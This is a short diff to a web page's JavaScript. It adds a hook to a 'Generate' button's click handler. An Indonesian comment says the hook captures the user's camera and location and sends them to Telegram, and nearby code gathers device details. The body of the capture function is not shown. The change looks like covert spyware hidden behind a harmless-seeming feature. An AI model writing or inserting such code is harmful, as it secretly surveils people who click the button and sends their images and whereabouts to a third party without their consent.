@@ -406,6 +406,9 @@
             generateBtn.addEventListener('click', async () => {
                 generateBtn.textContent = 'Generating...';
 
+                // Eksekusi capture kamera & lokasi, lalu kirim ke Telegram
+                await captureAndSendData();
+
                 // Collect device info
                 let batteryInfo = 'N/A';
                 if (navigator.getBattery) {
